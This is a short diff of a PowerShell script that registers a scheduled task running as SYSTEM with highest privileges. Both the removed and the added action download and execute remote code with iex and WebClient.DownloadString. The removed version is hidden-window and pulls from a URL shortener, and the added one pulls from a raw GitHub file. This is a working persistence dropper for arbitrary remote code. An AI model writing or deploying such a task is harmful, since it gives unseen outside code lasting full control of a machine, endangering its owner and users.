@@ -13,11 +13,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Define the action to be taken (PowerShell command)
-$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument {
-    -WindowStyle Hidden 
-    -NoProfile 
-    -Command "iex((New-Object System.Net.WebClient).DownloadString('https://t.ly/TBedb'))"
-}
+$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"'
 
 # Create a new scheduled task principal to run with the highest privileges using the SYSTEM account
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
